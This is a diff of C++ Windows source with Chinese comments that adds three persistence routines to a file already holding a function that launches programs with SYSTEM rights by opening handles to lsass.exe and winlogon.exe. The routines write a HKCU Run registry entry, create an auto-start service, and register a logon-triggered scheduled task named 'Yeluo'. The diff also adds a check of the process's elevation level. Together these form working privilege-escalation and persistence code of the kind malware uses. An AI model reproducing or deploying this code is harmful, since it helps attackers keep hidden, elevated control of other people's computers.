@@ -89,6 +89,40 @@ BOOL GetPrivileges()
 	//std::cout << "获取特权成功" << std::endl;
 	return true;
 }
+int GetProcessPermission()
+{
+	HANDLE hToken;
+	TOKEN_ELEVATION_TYPE elevationType;
+	DWORD dwSize;
+	BOOL bSuccess;
+
+	// 获取当前进程的Token句柄
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+	{
+		return 1;
+	}
+
+	// 获取Token的提升类型
+	bSuccess = GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(TOKEN_ELEVATION_TYPE), &dwSize);
+	CloseHandle(hToken);
+	if (!bSuccess)
+	{
+		return 1;
+	}
+
+	// 根据提升类型返回权限级别
+	switch (elevationType)
+	{
+	case TokenElevationTypeDefault:
+		return 1;
+	case TokenElevationTypeLimited:
+		return 2;
+	case TokenElevationTypeFull:
+		return 3;
+	default:
+		return 1;
+	}
+}
 /*以system权限打开一个程序*/
 BOOL CreateInSystem(LPWSTR processName)
 {
@@ -103,7 +137,7 @@ BOOL CreateInSystem(LPWSTR processName)
 	AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
 	CloseHandle(hToken);
 
-	// 枚举进程获取 lsass.exe 的 ID 和 winlogon.exe 的 ID，它们是少有的可以直接打开句柄的系统进程
+	// 枚举进程获取 lsass.exe 的 ID 和 winlogon.exe 
 	DWORD idL{}, idW{};
 	PROCESSENTRY32 pe;
 	pe.dwSize = sizeof(PROCESSENTRY32);
@@ -147,5 +181,123 @@ BOOL CreateInSystem(LPWSTR processName)
 	}
 	CloseHandle(pi.hThread);
 	CloseHandle(pi.hProcess);
+	return true;
+}
+BOOL RootKeyAddStartup(LPCTSTR lpApplicationName, LPCTSTR lpKeyName)
+{
+	HKEY hKey;
+	LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	if (lResult != ERROR_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	lResult = RegSetValueEx(hKey, lpKeyName, 0, REG_SZ, (LPBYTE)lpApplicationName, strlen(lpApplicationName));
+	RegCloseKey(hKey);
+
+	if (lResult != ERROR_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	return TRUE;
+}
+BOOL ServiceAddStartup(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR binaryPath)
+{
+	// 打开服务控制管理器
+	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (!scmHandle)
+	{
+		return FALSE;
+	}
+
+	// 创建服务
+	SC_HANDLE serviceHandle = CreateService(scmHandle, serviceName, displayName,
+		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
+		SERVICE_ERROR_NORMAL, binaryPath, NULL, NULL, NULL, NULL, NULL);
+
+	if (!serviceHandle)
+	{
+		// 如果创建服务失败，关闭服务控制管理器句柄并返回失败
+		CloseServiceHandle(scmHandle);
+		return FALSE;
+	}
+
+	// 关闭服务句柄和服务控制管理器句柄
+	CloseServiceHandle(serviceHandle);
+	CloseServiceHandle(scmHandle);
+
+	return TRUE;
+}
+BOOL ITaskToStartup(const std::wstring& appPath) {
+	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+	if (FAILED(hr)) {
+		return false;
+	}
+
+	// 创建 ITaskService 对象
+	ITaskService* pService = NULL;
+	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
+	if (FAILED(hr)) {
+		CoUninitialize();
+		return false;
+	}
+
+	// 连接到本地计算机
+	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+	if (FAILED(hr)) {
+		pService->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	// 获取根文件夹
+	ITaskFolder* pRootFolder = NULL;
+	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
+	if (FAILED(hr)) {
+		pService->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	// 创建任务定义
+	ITaskDefinition* pTask = NULL;
+	hr = pService->NewTask(0, &pTask);
+	pService->Release();
+	if (FAILED(hr)) {
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	// 设置任务名称和描述
+	_bstr_t appPathBstr(SysAllocString(appPath.c_str()));
+	pTask->put_XmlText(_bstr_t(L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
+		"<Triggers>\n"
+		"<LogonTrigger>\n"
+		"<Enabled>true</Enabled>\n"
+	//	"< UserId > SYSTEM < / UserId>\n"
+		"</LogonTrigger>\n"
+		"</Triggers>\n"
+		"<Actions>\n"
+		"<Exec>\n"
+		"<Command>") + appPathBstr + L"</Command>\n"
+		"</Exec>\n"
+		"</Actions>\n"
+		"</Task>");
+	// 向计划任务文件夹中添加任务
+	IRegisteredTask* pRegisteredTask = NULL;
+	hr = pRootFolder->RegisterTaskDefinition(_bstr_t("Yeluo"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);
+	if (FAILED(hr)) {
+		pTask->Release();
+		pRootFolder->Release();
+		CoUninitialize();
+		return false;
+	}
+
+	pRegisteredTask->Release();
+	pTask->Release();
+	pRootFolder->Release();
+	CoUninitialize();
 	return true;
 }
